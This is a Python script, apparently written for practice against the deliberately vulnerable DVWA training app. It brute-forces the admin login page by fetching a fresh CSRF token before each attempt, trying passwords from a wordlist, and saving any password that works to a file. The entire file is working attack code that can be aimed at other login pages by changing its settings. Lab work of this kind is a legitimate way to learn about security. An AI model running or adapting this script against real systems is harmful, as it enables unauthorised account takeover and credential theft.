import argparse
import requests
import time
from bs4 import BeautifulSoup


def get_csrf_token(session, url):
    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        token_input = soup.find("input", {"name": "user_token"})
        return token_input["value"] if token_input else None
    except requests.RequestException as e:
        print(f"[WARNING] Failed to fetch CSRF token: {e}")
        return None


def attempt_login(session, url, username, password, token):
    data = {
        "username": username,
        "password": password.strip(),
        "Login": "Login",
        "user_token": token
    }
    try:
        response = session.post(url, data=data, timeout=10)
        response.raise_for_status()
        return response
    except requests.RequestException as e:
        print(f"[WARNING] Login request failed: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(description="DVWA Brute-Force Attack Script")
    parser.add_argument("--url", default="http://localhost/dvwa/login.php", help="Target login URL (default: http://localhost/dvwa/login.php)")
    parser.add_argument("--username", default="admin", help="Username to attack (default: admin)")
    parser.add_argument("--wordlist", default="top1000.txt", help="Path to wordlist file (default: top1000.txt)")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between attempts in seconds (default: 0.5)")
    parser.add_argument("--output", "-o", help="File to save successful results to")
    args = parser.parse_args()

    session = requests.Session()

    try:
        with open(args.wordlist, "r", encoding="latin-1") as f:
            passwords = f.readlines()

        total = len(passwords)
        print(f"[INFO] Loaded {total} passwords from {args.wordlist}")
        print(f"[INFO] Target: {args.url} | Username: {args.username}\n")

        for index, password in enumerate(passwords, 1):
            password = password.strip()
            token = get_csrf_token(session, args.url)
            if not token:
                print("[ERROR] Could not retrieve CSRF token. Exiting.")
                break

            response = attempt_login(session, args.url, args.username, password, token)
            if not response:
                print("[ERROR] Skipping due to failed login request.")
                continue

            if "Login failed" not in response.text:
                print(f"\n[SUCCESS] Password found: {password} (attempt {index}/{total})")
                if args.output:
                    with open(args.output, "a") as out:
                        out.write(f"[SUCCESS] {args.username}:{password} @ {args.url}\n")
                    print(f"[INFO] Result saved to {args.output}")
                break
            else:
                print(f"[-] [{index}/{total}] Tried: {password}")

            time.sleep(args.delay)
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found: {args.wordlist}")
    except KeyboardInterrupt:
        print("\n[INFO] Script interrupted by user.")


if __name__ == "__main__":
    main()
